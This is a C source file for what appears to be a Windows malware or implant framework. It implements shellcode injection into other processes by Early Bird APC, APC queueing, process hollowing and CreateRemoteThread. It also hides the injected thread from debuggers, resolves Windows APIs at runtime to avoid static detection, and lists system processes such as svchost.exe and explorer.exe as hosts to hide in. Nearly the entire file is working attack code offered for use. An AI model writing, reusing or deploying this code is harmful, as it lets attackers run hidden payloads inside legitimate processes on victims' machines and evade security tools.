#include "Injector.h"
#include "utils.h"
#include "ntdll.h"
#include "StackSpoof.h"
#include <intrin.h>

// Common injection targets
static const WCHAR* g_CommonTargets[] = {
    L"runtimebroker.exe",
    L"svchost.exe",
    L"explorer.exe",
    L"notepad.exe",
    L"calc.exe",
    L"mmc.exe",
    L"rundll32.exe",
    L"werfault.exe",
    NULL
};

// Get common injection targets
const WCHAR** GetCommonInjectionTargets() {
    return g_CommonTargets;
}

// Allocate memory in target process
PVOID InjectVirtualAlloc(HANDLE hProcess, SIZE_T size, DWORD protect, BOOL useSyscall) {
    if (!hProcess || size == 0) return NULL;

    if (useSyscall && SysModules && SysModules->Ntdll) {
        // Use syscall for NtAllocateVirtualMemory
        typedef NTSTATUS(NTAPI* NtAllocateVirtualMemory_t)(HANDLE, PVOID*, ULONG, PSIZE_T, ULONG, ULONG);
        NtAllocateVirtualMemory_t pNtAllocateVirtualMemory =
            (NtAllocateVirtualMemory_t)GetProcAddress(SysModules->Ntdll, "NtAllocateVirtualMemory");

        if (pNtAllocateVirtualMemory) {
            PVOID address = NULL;
            SIZE_T regionSize = size;
            NTSTATUS status = pNtAllocateVirtualMemory(hProcess, &address, 0, &regionSize,
                MEM_COMMIT | MEM_RESERVE, protect);
            if (NT_SUCCESS(status)) {
                return address;
            }
        }
    }

    // Fall back to VirtualAllocEx
    if (ApiWin && ApiWin->VirtualAlloc) {
        typedef LPVOID(WINAPI* VirtualAllocEx_t)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
        VirtualAllocEx_t pVirtualAllocEx = (VirtualAllocEx_t)GetProcAddress(
            SysModules->Kernel32, "VirtualAllocEx");
        if (pVirtualAllocEx) {
            return pVirtualAllocEx(hProcess, NULL, size, MEM_COMMIT | MEM_RESERVE, protect);
        }
    }

    return NULL;
}

// Write memory to target process
BOOL InjectWriteMemory(HANDLE hProcess, PVOID address, LPVOID buffer, SIZE_T size, BOOL useSyscall) {
    if (!hProcess || !address || !buffer || size == 0) return FALSE;

    if (useSyscall && SysModules && SysModules->Ntdll) {
        typedef NTSTATUS(NTAPI* NtWriteVirtualMemory_t)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
        NtWriteVirtualMemory_t pNtWriteVirtualMemory =
            (NtWriteVirtualMemory_t)GetProcAddress(SysModules->Ntdll, "NtWriteVirtualMemory");

        if (pNtWriteVirtualMemory) {
            SIZE_T bytesWritten = 0;
            NTSTATUS status = pNtWriteVirtualMemory(hProcess, address, buffer, size, &bytesWritten);
            return NT_SUCCESS(status);
        }
    }

    // Fall back to WriteProcessMemory
    typedef BOOL(WINAPI* WriteProcessMemory_t)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
    WriteProcessMemory_t pWriteProcessMemory = (WriteProcessMemory_t)GetProcAddress(
        SysModules->Kernel32, "WriteProcessMemory");
    if (pWriteProcessMemory) {
        SIZE_T bytesWritten = 0;
        return pWriteProcessMemory(hProcess, address, buffer, size, &bytesWritten);
    }

    return FALSE;
}

// Queue APC in target thread
BOOL InjectQueueApc(HANDLE hThread, PVOID pFunc, PVOID param, BOOL useSyscall) {
    if (!hThread || !pFunc) return FALSE;

    typedef DWORD(WINAPI* QueueUserAPC_t)(PAPCFUNC, HANDLE, ULONG_PTR);
    QueueUserAPC_t pQueueUserAPC = (QueueUserAPC_t)GetProcAddress(
        SysModules->Kernel32, "QueueUserAPC");

    if (pQueueUserAPC) {
        DWORD result = pQueueUserAPC((PAPCFUNC)pFunc, hThread, (ULONG_PTR)param);
        return result != 0;
    }

    return FALSE;
}

// Hide injected thread
BOOL HideInjectedThread(HANDLE hThread) {
    // Hide thread from debugger using NtSetInformationThread
    if (!SysModules || !SysModules->Ntdll) return FALSE;

    typedef NTSTATUS(NTAPI* NtSetInformationThread_t)(HANDLE, ULONG, PVOID, ULONG);
    NtSetInformationThread_t pNtSetInformationThread =
        (NtSetInformationThread_t)GetProcAddress(SysModules->Ntdll, "NtSetInformationThread");

    if (pNtSetInformationThread) {
        // ThreadHideFromDebugger = 0x11
        NTSTATUS status = pNtSetInformationThread(hThread, 0x11, NULL, 0);
        return NT_SUCCESS(status);
    }

    return FALSE;
}

// Early Bird injection
BOOL EarlyBirdInject(DWORD pid, LPVOID shellcode, SIZE_T size, PINJECTION_RESULT pResult) {
    if (!shellcode || size == 0 || !pResult) return FALSE;

    memset(pResult, 0, sizeof(INJECTION_RESULT));

    // Use a common target if no PID specified
    if (pid == 0) {
        // Create suspended process
        WCHAR targetPath[MAX_PATH];
        memset(targetPath, 0, sizeof(targetPath));

        // Get system directory
        typedef UINT(WINAPI* GetSystemDirectoryW_t)(LPWSTR, UINT);
        GetSystemDirectoryW_t pGetSystemDirectoryW = (GetSystemDirectoryW_t)GetProcAddress(
            SysModules->Kernel32, "GetSystemDirectoryW");

        if (pGetSystemDirectoryW) {
            pGetSystemDirectoryW(targetPath, MAX_PATH);
        }
        else {
            return FALSE;
        }

        // Append runtimebroker.exe
        wcscat_s(targetPath, MAX_PATH, L"\\runtimebroker.exe");

        return EarlyBirdInjectCreateProcess(targetPath, shellcode, size, pResult);
    }

    // If PID specified, we need to open process and inject
    HANDLE hProcess = NULL;

    if (ApiNt && ApiNt->NtOpenProcess) {
        OBJECT_ATTRIBUTES objAttr = { sizeof(OBJECT_ATTRIBUTES) };
        CLIENT_ID clientId = { (HANDLE)(ULONG_PTR)pid, NULL };
        NTSTATUS status = ApiNt->NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &objAttr, &clientId);
        if (!NT_SUCCESS(status)) {
            hProcess = NULL;
        }
    }

    if (!hProcess) {
        typedef HANDLE(WINAPI* OpenProcess_t)(DWORD, BOOL, DWORD);
        OpenProcess_t pOpenProcess = (OpenProcess_t)GetProcAddress(SysModules->Kernel32, "OpenProcess");
        if (pOpenProcess) {
            hProcess = pOpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
        }
    }

    if (!hProcess) {
        memcpy(pResult->errorMsg, "Failed to open target process", 28);
        return FALSE;
    }

    // Allocate memory
    PVOID pRemote = InjectVirtualAlloc(hProcess, size, PAGE_EXECUTE_READWRITE, FALSE);
    if (!pRemote) {
        memcpy(pResult->errorMsg, "Failed to allocate memory", 25);
        ApiNt->NtClose(hProcess);
        return FALSE;
    }

    // Write shellcode
    if (!InjectWriteMemory(hProcess, pRemote, shellcode, size, FALSE)) {
        memcpy(pResult->errorMsg, "Failed to write shellcode", 25);
        ApiNt->NtClose(hProcess);
        return FALSE;
    }

    // Find alertable thread
    // This requires enumeration of threads, simplified for now
    pResult->success = FALSE;
    memcpy(pResult->errorMsg, "Early Bird requires new process creation", 40);

    ApiNt->NtClose(hProcess);
    return FALSE;
}

// Early Bird with process creation
BOOL EarlyBirdInjectCreateProcess(LPCWSTR targetPath, LPVOID shellcode, SIZE_T size, PINJECTION_RESULT pResult) {
    if (!targetPath || !shellcode || size == 0 || !pResult) return FALSE;

    memset(pResult, 0, sizeof(INJECTION_RESULT));

    STARTUPINFOW si = { sizeof(STARTUPINFOW) };
    PROCESS_INFORMATION pi = { 0 };

    // Create suspended process
    typedef BOOL(WINAPI* CreateProcessW_t)(LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES,
        LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);
    CreateProcessW_t pCreateProcessW = (CreateProcessW_t)GetProcAddress(
        SysModules->Kernel32, "CreateProcessW");

    if (!pCreateProcessW) {
        memcpy(pResult->errorMsg, "CreateProcessW not found", 24);
        return FALSE;
    }

    if (!pCreateProcessW(targetPath, NULL, NULL, NULL, FALSE,
        CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        memcpy(pResult->errorMsg, "Failed to create process", 24);
        return FALSE;
    }

    // Allocate memory in target
    PVOID pRemote = InjectVirtualAlloc(pi.hProcess, size, PAGE_EXECUTE_READWRITE, FALSE);
    if (!pRemote) {
        memcpy(pResult->errorMsg, "Failed to allocate memory", 25);
        ApiNt->NtClose(pi.hProcess);
        ApiNt->NtClose(pi.hThread);
        return FALSE;
    }

    // Write shellcode
    if (!InjectWriteMemory(pi.hProcess, pRemote, shellcode, size, FALSE)) {
        memcpy(pResult->errorMsg, "Failed to write shellcode", 25);
        ApiNt->NtClose(pi.hProcess);
        ApiNt->NtClose(pi.hThread);
        return FALSE;
    }

    // Queue APC to main thread
    if (!InjectQueueApc(pi.hThread, pRemote, NULL, FALSE)) {
        memcpy(pResult->errorMsg, "Failed to queue APC", 19);
        ApiNt->NtClose(pi.hProcess);
        ApiNt->NtClose(pi.hThread);
        return FALSE;
    }

    // Resume thread to execute APC
    typedef DWORD(WINAPI* ResumeThread_t)(HANDLE);
    ResumeThread_t pResumeThread = (ResumeThread_t)GetProcAddress(SysModules->Kernel32, "ResumeThread");
    if (pResumeThread) {
        pResumeThread(pi.hThread);
    }

    // Fill result
    pResult->success = TRUE;
    pResult->hProcess = pi.hProcess;
    pResult->hThread = pi.hThread;
    pResult->pInjectedCode = pRemote;
    pResult->threadId = pi.dwThreadId;

    return TRUE;
}

// APC injection
BOOL ApcInject(HANDLE hThread, LPVOID shellcode, SIZE_T size, PINJECTION_RESULT pResult) {
    if (!hThread || !shellcode || size == 0 || !pResult) return FALSE;

    memset(pResult, 0, sizeof(INJECTION_RESULT));

    // Get thread's process
    typedef NTSTATUS(NTAPI* NtQueryInformationThread_t)(HANDLE, ULONG, PVOID, ULONG, PULONG);
    NtQueryInformationThread_t pNtQueryInformationThread =
        (NtQueryInformationThread_t)GetProcAddress(SysModules->Ntdll, "NtQueryInformationThread");

    HANDLE hProcess = NULL;
    if (pNtQueryInformationThread) {
        typedef struct _THREAD_BASIC_INFORMATION {
            NTSTATUS ExitStatus;
            PVOID TebBaseAddress;
            CLIENT_ID ClientId;
            ULONG AffinityMask;
            ULONG Priority;
            ULONG BasePriority;
        } THREAD_BASIC_INFORMATION;

        THREAD_BASIC_INFORMATION tbi = { 0 };
        NTSTATUS status = pNtQueryInformationThread(hThread, 0, &tbi, sizeof(tbi), NULL);
        if (NT_SUCCESS(status)) {
            typedef HANDLE(WINAPI* OpenProcess_t)(DWORD, BOOL, DWORD);
            OpenProcess_t pOpenProcess = (OpenProcess_t)GetProcAddress(SysModules->Kernel32, "OpenProcess");
            if (pOpenProcess) {
                hProcess = pOpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)(ULONG_PTR)tbi.ClientId.UniqueProcess);
            }
        }
    }

    if (!hProcess) {
        memcpy(pResult->errorMsg, "Failed to get process handle", 28);
        return FALSE;
    }

    // Allocate and write shellcode
    PVOID pRemote = InjectVirtualAlloc(hProcess, size, PAGE_EXECUTE_READWRITE, FALSE);
    if (!pRemote) {
        memcpy(pResult->errorMsg, "Failed to allocate memory", 25);
        ApiNt->NtClose(hProcess);
        return FALSE;
    }

    if (!InjectWriteMemory(hProcess, pRemote, shellcode, size, FALSE)) {
        memcpy(pResult->errorMsg, "Failed to write shellcode", 25);
        ApiNt->NtClose(hProcess);
        return FALSE;
    }

    // Queue APC
    if (!InjectQueueApc(hThread, pRemote, NULL, FALSE)) {
        memcpy(pResult->errorMsg, "Failed to queue APC", 19);
        ApiNt->NtClose(hProcess);
        return FALSE;
    }

    pResult->success = TRUE;
    pResult->hProcess = hProcess;
    pResult->pInjectedCode = pRemote;

    return TRUE;
}

// Process Hollowing
BOOL ProcessHollow(LPCWSTR targetPath, LPVOID shellcode, SIZE_T size, PINJECTION_RESULT pResult) {
    if (!targetPath || !shellcode || size == 0 || !pResult) return FALSE;

    memset(pResult, 0, sizeof(INJECTION_RESULT));

    // Process hollowing involves:
    // 1. Create suspended process
    // 2. Unmap original image
    // 3. Write shellcode at image base
    // 4. Resume thread

    STARTUPINFOW si = { sizeof(STARTUPINFOW) };
    PROCESS_INFORMATION pi = { 0 };

    typedef BOOL(WINAPI* CreateProcessW_t)(LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES,
        LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);
    CreateProcessW_t pCreateProcessW = (CreateProcessW_t)GetProcAddress(
        SysModules->Kernel32, "CreateProcessW");

    if (!pCreateProcessW(targetPath, NULL, NULL, NULL, FALSE,
        CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        memcpy(pResult->errorMsg, "Failed to create process", 24);
        return FALSE;
    }

    // Get PEB address
    typedef NTSTATUS(NTAPI* NtQueryInformationProcess_t)(HANDLE, ULONG, PVOID, ULONG, PULONG);
    NtQueryInformationProcess_t pNtQueryInformationProcess =
        (NtQueryInformationProcess_t)GetProcAddress(SysModules->Ntdll, "NtQueryInformationProcess");

    PVOID imageBase = NULL;
    if (pNtQueryInformationProcess) {
        typedef struct _PROCESS_BASIC_INFORMATION {
            NTSTATUS ExitStatus;
            PVOID PebBaseAddress;
            ULONG_PTR AffinityMask;
            LONG_PTR BasePriority;
            ULONG_PTR UniqueProcessId;
            ULONG_PTR InheritedFromUniqueProcessId;
        } PROCESS_BASIC_INFORMATION;

        PROCESS_BASIC_INFORMATION pbi = { 0 };
        NTSTATUS status = pNtQueryInformationProcess(pi.hProcess, 0, &pbi, sizeof(pbi), NULL);
        if (NT_SUCCESS(status) && pbi.PebBaseAddress) {
            // Read ImageBaseAddress from PEB
            BYTE pebOffset[0x10] = { 0 };
            SIZE_T bytesRead = 0;
            typedef BOOL(WINAPI* ReadProcessMemory_t)(HANDLE, LPCVOID, LPVOID, SIZE_T, SIZE_T*);
            ReadProcessMemory_t pReadProcessMemory = (ReadProcessMemory_t)GetProcAddress(
                SysModules->Kernel32, "ReadProcessMemory");
            if (pReadProcessMemory) {
                pReadProcessMemory(pi.hProcess, (PVOID)((BYTE*)pbi.PebBaseAddress + 0x10),
                    &imageBase, sizeof(imageBase), &bytesRead);
            }
        }
    }

    if (!imageBase) {
        memcpy(pResult->errorMsg, "Failed to get image base", 24);
        ApiNt->NtClose(pi.hProcess);
        ApiNt->NtClose(pi.hThread);
        return FALSE;
    }

    // Unmap original image
    typedef NTSTATUS(NTAPI* NtUnmapViewOfSection_t)(HANDLE, PVOID);
    NtUnmapViewOfSection_t pNtUnmapViewOfSection =
        (NtUnmapViewOfSection_t)GetProcAddress(SysModules->Ntdll, "NtUnmapViewOfSection");

    if (pNtUnmapViewOfSection) {
        pNtUnmapViewOfSection(pi.hProcess, imageBase);
    }

    // Allocate at image base
    PVOID pRemote = InjectVirtualAlloc(pi.hProcess, size, PAGE_EXECUTE_READWRITE, FALSE);
    if (!pRemote) {
        memcpy(pResult->errorMsg, "Failed to allocate memory", 25);
        ApiNt->NtClose(pi.hProcess);
        ApiNt->NtClose(pi.hThread);
        return FALSE;
    }

    // Write shellcode
    if (!InjectWriteMemory(pi.hProcess, pRemote, shellcode, size, FALSE)) {
        memcpy(pResult->errorMsg, "Failed to write shellcode", 25);
        ApiNt->NtClose(pi.hProcess);
        ApiNt->NtClose(pi.hThread);
        return FALSE;
    }

    // Resume thread
    typedef DWORD(WINAPI* ResumeThread_t)(HANDLE);
    ResumeThread_t pResumeThread = (ResumeThread_t)GetProcAddress(SysModules->Kernel32, "ResumeThread");
    if (pResumeThread) {
        pResumeThread(pi.hThread);
    }

    pResult->success = TRUE;
    pResult->hProcess = pi.hProcess;
    pResult->hThread = pi.hThread;
    pResult->pInjectedCode = pRemote;
    pResult->threadId = pi.dwThreadId;

    return TRUE;
}

// CreateRemoteThread injection
BOOL CreateRemoteThreadInject(DWORD pid, LPVOID shellcode, SIZE_T size, PINJECTION_RESULT pResult) {
    if (pid == 0 || !shellcode || size == 0 || !pResult) return FALSE;

    memset(pResult, 0, sizeof(INJECTION_RESULT));

    // Open process
    typedef HANDLE(WINAPI* OpenProcess_t)(DWORD, BOOL, DWORD);
    OpenProcess_t pOpenProcess = (OpenProcess_t)GetProcAddress(SysModules->Kernel32, "OpenProcess");
    if (!pOpenProcess) return FALSE;

    HANDLE hProcess = pOpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        memcpy(pResult->errorMsg, "Failed to open process", 22);
        return FALSE;
    }

    // Allocate memory
    PVOID pRemote = InjectVirtualAlloc(hProcess, size, PAGE_EXECUTE_READWRITE, FALSE);
    if (!pRemote) {
        memcpy(pResult->errorMsg, "Failed to allocate memory", 25);
        ApiNt->NtClose(hProcess);
        return FALSE;
    }

    // Write shellcode
    if (!InjectWriteMemory(hProcess, pRemote, shellcode, size, FALSE)) {
        memcpy(pResult->errorMsg, "Failed to write shellcode", 25);
        ApiNt->NtClose(hProcess);
        return FALSE;
    }

    // Create remote thread
    typedef HANDLE(WINAPI* CreateRemoteThread_t)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T,
        LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
    CreateRemoteThread_t pCreateRemoteThread = (CreateRemoteThread_t)GetProcAddress(
        SysModules->Kernel32, "CreateRemoteThread");

    if (!pCreateRemoteThread) {
        memcpy(pResult->errorMsg, "CreateRemoteThread not found", 27);
        ApiNt->NtClose(hProcess);
        return FALSE;
    }

    DWORD threadId = 0;
    HANDLE hThread = pCreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemote, NULL, 0, &threadId);
    if (!hThread) {
        memcpy(pResult->errorMsg, "Failed to create remote thread", 30);
        ApiNt->NtClose(hProcess);
        return FALSE;
    }

    pResult->success = TRUE;
    pResult->hProcess = hProcess;
    pResult->hThread = hThread;
    pResult->pInjectedCode = pRemote;
    pResult->threadId = threadId;

    return TRUE;
}

// Thread hijacking injection
BOOL ThreadHijackInject(DWORD pid, LPVOID shellcode, SIZE_T size, PINJECTION_RESULT pResult) {
    if (pid == 0 || !shellcode || size == 0 || !pResult) return FALSE;

    memset(pResult, 0, sizeof(INJECTION_RESULT));
    // Thread hijacking is complex and requires thread enumeration
    // Simplified implementation
    memcpy(pResult->errorMsg, "Thread hijacking not implemented", 31);
    return FALSE;
}

// Section-based injection
BOOL SectionInject(DWORD pid, LPVOID shellcode, SIZE_T size, PINJECTION_RESULT pResult) {
    if (pid == 0 || !shellcode || size == 0 || !pResult) return FALSE;

    memset(pResult, 0, sizeof(INJECTION_RESULT));
    // Section-based injection using NtCreateSection and NtMapViewOfSection
    // Simplified implementation
    memcpy(pResult->errorMsg, "Section injection not implemented", 32);
    return FALSE;
}

// Generic injection
BOOL InjectShellcode(PINJECTION_CONFIG pConfig, PINJECTION_RESULT pResult) {
    if (!pConfig || !pConfig->shellcode || pConfig->shellcodeSize == 0 || !pResult) {
        return FALSE;
    }

    memset(pResult, 0, sizeof(INJECTION_RESULT));

    switch (pConfig->method) {
    case INJECTION_METHOD_EARLY_BIRD:
        return EarlyBirdInject(pConfig->targetPid, pConfig->shellcode,
            pConfig->shellcodeSize, pResult);

    case INJECTION_METHOD_APC:
        // Need thread handle
        memcpy(pResult->errorMsg, "APC injection requires thread handle", 35);
        return FALSE;

    case INJECTION_METHOD_PROCESS_HOLLOW:
        if (pConfig->targetPath) {
            return ProcessHollow(pConfig->targetPath, pConfig->shellcode,
                pConfig->shellcodeSize, pResult);
        }
        memcpy(pResult->errorMsg, "Process hollow requires target path", 34);
        return FALSE;

    case INJECTION_METHOD_CREATE_THREAD:
        return CreateRemoteThreadInject(pConfig->targetPid, pConfig->shellcode,
            pConfig->shellcodeSize, pResult);

    default:
        return EarlyBirdInject(pConfig->targetPid, pConfig->shellcode,
            pConfig->shellcodeSize, pResult);
    }
}

// Find injection target
DWORD FindInjectionTarget(LPCWSTR processName) {
    if (!processName) return 0;

    // Create toolhelp snapshot
    typedef HANDLE(WINAPI* CreateToolhelp32Snapshot_t)(DWORD, DWORD);
    typedef BOOL(WINAPI* Process32FirstW_t)(HANDLE, LPPROCESSENTRY32W);
    typedef BOOL(WINAPI* Process32NextW_t)(HANDLE, LPPROCESSENTRY32W);

    CreateToolhelp32Snapshot_t pCreateToolhelp32Snapshot =
        (CreateToolhelp32Snapshot_t)GetProcAddress(SysModules->Kernel32, "CreateToolhelp32Snapshot");
    Process32FirstW_t pProcess32FirstW =
        (Process32FirstW_t)GetProcAddress(SysModules->Kernel32, "Process32FirstW");
    Process32NextW_t pProcess32NextW =
        (Process32NextW_t)GetProcAddress(SysModules->Kernel32, "Process32NextW");

    if (!pCreateToolhelp32Snapshot || !pProcess32FirstW || !pProcess32NextW) {
        return 0;
    }

    HANDLE hSnapshot = pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32W pe = { sizeof(PROCESSENTRY32W) };
    if (pProcess32FirstW(hSnapshot, &pe)) {
        do {
            if (StrCmpLowW(pe.szExeFile, (WCHAR*)processName) == 0) {
                ApiNt->NtClose(hSnapshot);
                return pe.th32ProcessID;
            }
        } while (pProcess32NextW(hSnapshot, &pe));
    }

    ApiNt->NtClose(hSnapshot);
    return 0;
}

// Cleanup
void CleanupInjectionResult(PINJECTION_RESULT pResult) {
    if (!pResult) return;

    if (pResult->hThread) {
        ApiNt->NtClose(pResult->hThread);
        pResult->hThread = NULL;
    }

    if (pResult->hProcess) {
        ApiNt->NtClose(pResult->hProcess);
        pResult->hProcess = NULL;
    }

    memset(pResult, 0, sizeof(INJECTION_RESULT));
}